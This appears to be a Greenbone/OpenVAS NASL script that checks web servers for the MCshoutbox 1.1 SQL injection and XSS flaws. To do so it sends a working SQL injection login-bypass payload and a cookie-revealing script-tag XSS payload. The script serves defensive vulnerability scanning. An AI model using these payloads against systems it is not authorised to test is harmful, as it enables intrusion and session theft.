# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900883");
  script_version("2024-01-19T16:09:33+0000");
  script_tag(name:"last_modification", value:"2024-01-19 16:09:33 +0000 (Fri, 19 Jan 2024)");
  script_tag(name:"creation_date", value:"2009-10-29 07:53:15 +0100 (Thu, 29 Oct 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-3714", "CVE-2009-3715");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("MCshoutbox Multiple <= 1.1 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"MCshoutbox is prone to multiple SQL injection (SQLi) and
  cross-site scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends multiple HTTP requests and checks the responses.");

  script_tag(name:"insight", value:"- Input passed via the 'loginerror' to admin_login.php is not
  properly sanitised before being returned to the user. This can be exploited to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.

  - Input passed via the 'username' and 'password' parameters to scr_login.php is not properly
  sanitised before being used in an SQL query. This can be exploited to manipulate SQL queries by
  injecting arbitrary SQL code.

  - The application does not properly check extensions of uploaded 'smilie' image files. This can
  be exploited to upload and execute arbitrary PHP code.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to bypass the
  authentication mechanism when 'magic_quotes_gpc' is disabled or can cause arbitrary code
  execution by uploading the shell code in the context of the web application.");

  script_tag(name:"affected", value:"MCshoutbox version 1.1 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35885/");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9205");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2009/1961");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/MCshoutBox", "/shoutbox", "/box", "/", http_cgi_dirs( port:port ) ) ) {
  if( dir == "/" )
    dir = "";

  res = http_get_cache( port:port, item:dir + "/shoutbox.php" );
  if( ! res || res !~ "^HTTP/1\.[01] 200" || ">Shoutbox<" >!< res )
    continue;

  filename1 = dir + "/scr_login.php";
  filename2 = dir + "/admin_login.php";

  data = "username='or''='&password='or''='";

  headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );

  req = http_post_put_req( port:port, url:filename1, data:data, add_headers:headers );
  res = http_keepalive_send_recv( port:port, data:req );

  if( egrep( pattern:"Location: admin.php", string:res ) ) {
    report = http_report_vuln_url( port:port, url:filename2 );
    security_message( port:port, data:report );
    exit( 0 );
  }

  url = dir + "/admin_login.php?loginerror=<script>alert(document.cookie)</script>";

  if( http_vuln_check( port:port, url:url, pattern:"><script>alert(document\.cookie)</script><",
                       check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
